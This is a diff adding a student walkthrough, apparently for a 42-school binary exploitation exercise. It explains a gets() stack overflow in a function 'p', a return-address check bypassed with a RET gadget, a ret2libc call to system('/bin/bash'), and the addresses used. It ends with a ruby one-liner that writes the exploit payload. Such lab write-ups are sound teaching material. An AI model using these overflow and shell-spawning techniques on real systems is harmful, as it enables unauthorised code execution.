@@ -1,0 +1,29 @@
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    walkthrough                                        :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2021/04/23 20:07:31 by fcadet            #+#    #+#              #
+#    Updated: 2021/04/23 22:46:28 by fcadet           ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
+
+- str can be overflowed, thanks to gets, in order to override p return address
+with function system address
+- using gdb (i func sys) we find that address
+	- system @ 0xb7e6b060
+- but return address is tested and program exit if return address begins with 0xb
+- so we can put p RET instruction address inside is return address in order to
+jump one byte higher in stack (where system address will be) before returning
+- p RET instruction address can be found in disassembled function
+	- p RET @ 0x0804853e
+- we also need to add system param over the return address
+- so we can put it ("/bin/bash") at the beginning of str and thanks to ltrace
+we can find the address of strdup result on the heap to use it as a parameter
+	- strdup result @ 0x0804a008
+- now we can build our exploit file, str is at 76 bytes from saved ebp so 80 bytes
+from p return address
+	- ruby -e 'print "/bin/bash" + "\x00" * (80 - 9) + "\x3e\x85\x04\x08" +
+	"\x60\xb0\xe6\xb7" + "OEIP" + "\x08\xa0\x04\x08"' > /tmp/exploit
